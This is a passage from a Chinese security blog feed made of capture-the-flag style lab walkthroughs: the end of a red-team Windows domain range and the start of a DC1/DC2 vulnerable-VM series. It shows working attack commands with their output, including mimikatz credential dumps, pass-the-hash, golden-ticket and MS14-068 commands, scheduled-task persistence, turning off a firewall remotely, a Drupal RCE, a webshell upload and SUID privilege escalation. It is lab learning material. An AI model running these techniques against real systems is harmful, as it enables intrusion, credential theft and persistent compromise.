class="line">                           [04]: KB976902</span><br><span class="line">Network Card(s):           4 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.93.40</span><br><span class="line">                                 [02]: fe80::31c7:aebb:d3a:2483</span><br><span class="line">                           [02]: Bluetooth 设备(个人区域网)</span><br><span class="line">                                 Connection Name: Bluetooth 网络连接</span><br><span class="line">                                 Status:          Media disconnected</span><br><span class="line">                           [03]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接 2</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.10.10.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.2</span><br><span class="line">                                 [02]: fe80::dc73:8b1c:8bf8:4e13</span><br><span class="line">                           [04]: Microsoft Loopback Adapter</span><br><span class="line">                                 Connection Name: Npcap Loopback Adapter</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     255.255.255.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 169.254.129.186</span><br><span class="line">                                 [02]: fe80::b461:ccad:e30f:81ba</span><br></pre></td></tr></table></figure><p>然而想要提权，烂土豆用不了，没有模拟权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State   </span><br><span class="line">============================= ==================================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用CVE-2018-8120提权（然后设置payload为bind_tcp即可）：</p><p>使用模块：<code>post/multi/recon/local_exploit_suggester</code>，它会提示哪些可以用</p><p>权限维持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC MINUTE /ST 11:01 /TR C:\Windows\4801.exe /RL HIGHEST</span><br></pre></td></tr></table></figure><p>搜集信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1456947 (00000000:00163b33)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : moretz</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/26 15:29:48</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1115</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : moretz</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Moretz2021</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73 </span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 49813 (00000000:0000c295)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : </span><br><span class="line">        wdigest :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73</span><br><span class="line">         </span><br><span class="line">                  [00000003] Primary</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 803959d82b51f5761137db87ef1aa382</span><br><span class="line">         * SHA1     : bc43c01c03781bc2883789571f720c1f858b1453</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域横向"><a class="markdownIt-Anchor" href="#域横向"></a> 域横向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">#黄金票据</span><br><span class="line">mimikatz.exe kerberos::golden /admin:administrator /domain:WHOAMIANONY.org /sid:S-1-5-21-1315137663-3706837544-1429009142-1115 /krbtgt:ab89b1295e69d353dd7614c7a3a80cec /ticket:gold.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.\MS14-068.exe -u moretz@WHOAMIANONY.org -s S-1-5-21-1315137663-3706837544-1429009142-1115 -d 192.168.93.40 -p Moretz2021</span><br><span class="line"></span><br><span class="line">#先使用IPC传文件，当然也可以用impacket了</span><br><span class="line">schtasks /Create /s 192.168.93.30 /TN sysRev5 /SC MINUTE /ST 11:05 /TR C:\Windows\4802.exe #这次行不通了</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;c:\\Windows\\4803.exe&quot; #需要先关掉防火墙后，我们才能bind进来</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><h1 id="dc域控"><a class="markdownIt-Anchor" href="#dc域控"></a> DC域控</h1><p>对于横向，无非就几种方法，明文传递（IPC）/哈希传递/票据传递，然后就是约束与非约束委派，再来就是exchange，而执行命令可以使用计划任务执行，也可以使用impacket执行，psexec/smb/wmi执行等。而获取域控的方法有：</p><ul><li>金银票据</li><li>MS14-068</li><li>SYSVOL</li></ul><h2 id="spn"><a class="markdownIt-Anchor" href="#spn"></a> SPN</h2><p>先使用SPN扫一下有什么服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 在任何域机器中执行（需要system权限）</span><br><span class="line">setspn -T WHOAMIANONY.org -Q */*</span><br><span class="line">Checking domain DC=whoamianony,DC=org</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/DC</span><br><span class="line">        TERMSRV/DC.whoamianony.org</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/ForestDnsZones.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/DomainDnsZones.whoamianony.org</span><br><span class="line">        DNS/DC.whoamianony.org</span><br><span class="line">        GC/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC</span><br><span class="line">        RPC/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        HOST/DC/WHOAMIANONY</span><br><span class="line">        HOST/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        HOST/DC</span><br><span class="line">        HOST/DC.whoamianony.org</span><br><span class="line">        HOST/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/01982af1-1153-4ddc-b024-9a35fd66b0af/whoamianony.org</span><br><span class="line">        ldap/DC/WHOAMIANONY</span><br><span class="line">        ldap/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        ldap/DC</span><br><span class="line">        ldap/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/whoamianony.org</span><br><span class="line">CN=krbtgt,CN=Users,DC=whoamianony,DC=org</span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=PC2,CN=Computers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/PC2</span><br><span class="line">        TERMSRV/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2.whoamianony.org</span><br><span class="line">        HOST/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2</span><br><span class="line">        HOST/PC2</span><br><span class="line"></span><br><span class="line">Existing SPN found!</span><br></pre></td></tr></table></figure><h2 id="pth"><a class="markdownIt-Anchor" href="#pth"></a> PTH</h2><p>使用mimikatz的pth会生成一个窗口，不太好用，如果密码错误，则这个窗口也不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727144550596.png" alt="image-20230727144550596" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/9fa2405ea218d96cef3e6995b578ebb5.jpg" alt="9fa2405ea218d96cef3e6995b578ebb5" /></p><p>其他还有psexec等等的哈希传递，挺好用的</p><h2 id="金银票据与ms14-068以pc2进行与ptk"><a class="markdownIt-Anchor" href="#金银票据与ms14-068以pc2进行与ptk"></a> 金/银票据与MS14-068（以PC2进行）与PTK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">* Username : Administrator</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* Password : Whoami2021</span><br><span class="line">* NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">* Username : bunny</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">* Password : Bunny2021</span><br><span class="line"></span><br><span class="line">域控IP：192.168.93.30</span><br><span class="line">本机IP：192.168.93.20</span><br></pre></td></tr></table></figure><p>流程：<a href="https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket">https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket</a></p><ol><li><p>清空凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">privilege::debug</span><br><span class="line">kerberos::list //查看当前机器凭证</span><br><span class="line">kerberos::purge//清空当前机器中所有凭证</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>制作金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line">OPTIONS:</span><br><span class="line">    -p &lt;clearPassword&gt;</span><br><span class="line"> --rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u bunny@whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142-500 -d 192.168.93.30 -p Bunny2021</span><br><span class="line"># 得到TGT_moretz@whoamianony.org.ccache</span><br><span class="line"></span><br><span class="line">## 其他工具</span><br><span class="line"># goldenPac.py</span><br><span class="line">python3 goldenPac.py zjun.com/user1:P@ssw0rd@P-DC.zjun.com -dc-ip 172.16.86.136 -target-ip 172.16.86.136 -debug</span><br><span class="line"></span><br><span class="line"># goldenPac.exe</span><br><span class="line">goldenPac.exe zjun.com/user1:P@ssw0rd@P-DC.zjun.com</span><br><span class="line"></span><br><span class="line"># msf</span><br><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line"></span><br><span class="line"># kekeo</span><br><span class="line">exploit::ms14068 /domain:zjun.com /user:user1 /password:P@ssw0rd /sid:S-1-5-21-2335421620-514153290-2844484534-1125 /ptt</span><br><span class="line"></span><br><span class="line"># mimikatz</span><br><span class="line">kerberos::golden /krbtgt: /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727135555788.png" alt="image-20230727135555788" /></p></li><li><p>注入票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">kerberos::ptc TGT_moretz@whoamianony.org.ccache</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727140234573.png" alt="image-20230727140234573" /></p></li><li><p>写入成功后，使用PsExec.exe等以管理员权限运行连接域控。<code>Logon Server      : DC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.93.30\ c:\Windows\Temp\4803.exe</span><br></pre></td></tr></table></figure><p>这个psexec是原生的就好，impacket的用不了，以上的图可能放错了，将就看把</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727161341392.png" alt="image-20230727161341392" /></p></li></ol><h2 id="dcomsmbwmi都是impacket就不说了"><a class="markdownIt-Anchor" href="#dcomsmbwmi都是impacket就不说了"></a> DCOM/SMB/WMI（都是impacket，就不说了）</h2><p>DCOM：DCOM 是 COM（组件对象模型）的扩展，它允许应用程序在远程计算机上实例化和访问 COM 对象的属性和方法。参考：<a href="https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom">https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom</a></p><h2 id="zerologon-cve-2020-1472"><a class="markdownIt-Anchor" href="#zerologon-cve-2020-1472"></a> ZEROLogon CVE-2020-1472</h2><p><a href="https://www.hacking8.com/tiquan/windows/NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2020-1472.html">https://www.hacking8.com/tiquan/windows/NetLogon域内提权漏洞CVE-2020-1472.html</a></p><h2 id="拿到域控之后"><a class="markdownIt-Anchor" href="#拿到域控之后"></a> 拿到域控之后</h2><p>做维持：</p><ol><li>脱下ndti.dts这个数据库，然后爆破</li><li>搜集kbgts用户的ntlm哈希，存起来用来做金票据（这个跟ms14-068不一样哈，这是堂堂正正拿的！）</li><li></li></ol><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础环境设置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础环境设置&quot;&gt;&lt;/a&gt; 基础环境设置&lt;/h1&gt;
&lt;p&gt;192.168.95.143&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/9eek/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DC系列靶机</title>
    <link href="https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/"/>
    <id>https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</id>
    <published>2023-07-12T06:02:32.000Z</published>
    <updated>2023-07-12T06:02:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dc1"><a class="markdownIt-Anchor" href="#dc1"></a> DC1</h1><h2 id="涉及知识点"><a class="markdownIt-Anchor" href="#涉及知识点"></a> 涉及知识点</h2><ol><li>drupal版本识别+<a href="https://blog.csdn.net/limb0/article/details/107122919">drupal RCE漏洞</a></li><li>drupal自定义密码哈希脚本查找</li><li>drupal配置文件查询</li><li>mysql增删查改</li><li>meterpreter上传下载</li><li>suid提权</li></ol><h2 id="实践"><a class="markdownIt-Anchor" href="#实践"></a> 实践</h2><p>扫描网段：发现主机10.131.210.98</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140435902.png" alt="image-20230712140435902" /></p><p>使用nmap扫一下：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140545277.png" alt="image-20230712140545277" /></p><p>看来可以做ssh爆破，看一下web：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140628372.png" alt="image-20230712140628372" /></p><p>发现是apache2.2.22+drupal7+PHP5.4。扫一下目录，很多403,基本没用，那么就去看msf有什么可以利用的：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154719821.png" alt="image-20230712154719821" /></p><p>使用较新的，而且不用登录的，即第二个，设置好之后打进去，OK，<a href="http://xn--linenum-fw3kw4fpzjcwic18n162b.sh">上传冰蝎马和linenum.sh</a>，读取到flag1：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155004482.png" alt="image-20230712155004482" /></p><p>并且看到这个：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154841290.png" alt="image-20230712154841290" /></p><p>直接suid提权了：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155126132.png" alt="image-20230712155126132" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155104418.png" alt="image-20230712155104418" /></p><p>之后看到/home/flag4/flag4.txt。纳闷flag3去哪了。于是看到配置文件：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154940971.png" alt="image-20230712154940971" /></p><p>登录并且查数据：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712153950829.png" alt="image-20230712153950829" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">|        |                                                         |</span><br><span class="line">| admin  | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line">| Fred   | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br><span class="line">| admin1 | $S$DM59jnj9ztGmOy11bBQngVSuoaX6fVGsOgIXH/fLIMYYyjOjTX0Y |</span><br><span class="line">| admin2 | $S$DQDu/ko157iaafvOhwAPmbjZeMabVTLcu1bGdFbGUFfheKlB7u81 |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>他们有自己的加密方式，自己更新一个密码即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">mysql -h localhost -u dbuser -p</span><br><span class="line">Enter password:R0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DQZsZLqxCbnNCRuvOFCQBC2snsbkjGrH3Xw4nqxxhuYIONkuC4dP&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>登录看到flag3。</p><h1 id="dc2"><a class="markdownIt-Anchor" href="#dc2"></a> DC2</h1><h2 id="涉及的知识点"><a class="markdownIt-Anchor" href="#涉及的知识点"></a> 涉及的知识点</h2><ol><li>hosts添加域名解析</li><li>wpscan扫描网站+cewl生成密码+爆破密码</li><li>多端口nmap扫描</li><li>hydra爆破</li><li>绕过rbash</li><li>git提权</li></ol><h2 id="具体实践"><a class="markdownIt-Anchor" href="#具体实践"></a> 具体实践</h2><p>使用masscan扫了之后，发现进去之后，点击任何地方都会发生跳转，加上hosts就好了</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132647970.png" alt="image-20230713132647970" /></p><p>加上后，对IP进行扫描，发现如果是普通的nmap扫描只会返回默认的服务端口，像7001，所以要扫描所有端口需要扫1-65535。</p><p>发现wordpress，使用wpscan扫一下，枚举发现用户还有一些目录</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132413883.png" alt="image-20230713132413883" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ --wp-content-dir wp-content -e u</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713132330971.png" alt="image-20230713132330971" /></p><blockquote><p>这里我曾使用msf看有没有对应的漏洞，发现用不了，需要登录。所以看看怎么登录。在扫的时候，如果默认使用-e，那么不会返回tom这个结果，需要特别指定枚举</p></blockquote><p>搜索到flag1的内容，接触到cewl这个工具，生成了一个网站的dict，用它爆破（把搜集到的user放进去）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 